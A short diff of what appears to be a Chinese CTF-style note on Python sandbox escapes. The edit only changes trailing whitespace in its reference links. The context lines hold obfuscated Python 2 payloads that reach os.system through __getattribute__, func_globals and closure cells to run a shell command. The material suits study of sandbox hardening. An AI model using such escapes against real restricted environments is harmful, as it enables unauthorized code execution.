@@ -159,7 +159,7 @@ x.__getattribute__("func_global"+"s")['linecache'].__dict__['o'+'s'].__dict__['s
 print __import__.__getattribute__('__clo'+'sure__')[0].cell_contents('o'+'s').__getattribute__('sy'+'stem')('l'+'s home') 
 ```
 # 参考
-https://xz.aliyun.com/t/52#toc-10
-https://blog.csdn.net/qq_35078631/article/details/78504415
-https://www.anquanke.com/post/id/85571
+https://xz.aliyun.com/t/52#toc-10 
+https://blog.csdn.net/qq_35078631/article/details/78504415 
+https://www.anquanke.com/post/id/85571 
 http://bestwing.me/2018/05/03/awesome-python-sandbox-in-ciscn/#0x01
